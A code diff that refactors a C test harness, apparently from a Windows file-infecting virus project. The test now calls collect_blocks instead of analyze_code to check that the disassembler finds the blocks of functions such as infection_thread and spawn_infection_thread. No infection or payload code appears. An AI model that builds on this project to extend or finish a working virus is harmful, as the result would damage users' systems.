@@ -8,9 +8,8 @@
 #include "code_begin.h"
 #include "code_end.h"
 #include "delta.h"
-#include "disasm/analysis/analysis.h"
 #include "disasm/analysis/block.h"
-#include "disasm/analysis/call.h"
+#include "disasm/analysis/reference.h"
 #include "disasm/disasm.h"
 #include "function_kernel32.h"
 #include "infect.h"
@@ -25,8 +24,8 @@
 int main(int argc, char **argv) {
     const char *function_names[] = {"get_string",
                                     "checksum",
+                                    "collect_blocks",
                                     "get_delta_offset",
-                                    "analyze_code",
                                     "setup_disasm",
                                     "next_instruction",
                                     "get_current_instruction",
@@ -50,8 +49,8 @@ int main(int argc, char **argv) {
                                     NULL};
     const void *function_addresses[] = {(void *)get_string,
                                         (void *)checksum,
+                                        (void *)collect_blocks,
                                         (void *)get_delta_offset,
-                                        (void *)analyze_code,
                                         (void *)setup_disasm,
                                         (void *)next_instruction,
                                         (void *)get_current_instruction,
@@ -86,17 +85,17 @@ int main(int argc, char **argv) {
     memset(found_list, false, sizeof(bool) * expected);
 
     void *entrypoints[] = {(void *)spawn_infection_thread,
-                           (void *)infection_thread, (void *)analyze_code};
+                           (void *)infection_thread, (void*)collect_blocks, NULL};
 
-    CodeAnalysis *analysis =
-        analyze_code(entrypoints, 3, (void *)code_begin, (void *)code_end);
+    BlockList *blocks =
+        collect_blocks(entrypoints, (void *)code_begin, (void *)code_end);
 
-    if (analysis == NULL) {
-        fprintf(stderr, "analyze_code() returned NULL");
+    if (blocks == NULL) {
+        fprintf(stderr, "collect_blocks() returned NULL");
         return 1;
     }
 
-    for (BlockList *bl = analysis->block_list; bl != NULL; bl = bl->next) {
+    for (BlockList *bl = blocks; bl != NULL; bl = bl->next) {
         if (bl->block == NULL) {
             fprintf(stderr, "BlockList has block with NULL");
             return 1;
@@ -122,7 +121,7 @@ int main(int argc, char **argv) {
             }
         }
     }
-	free_code_analysis(analysis);
-	free(found_list);
+    free_block_list(blocks);
+    free(found_list);
     return found != expected;
 }
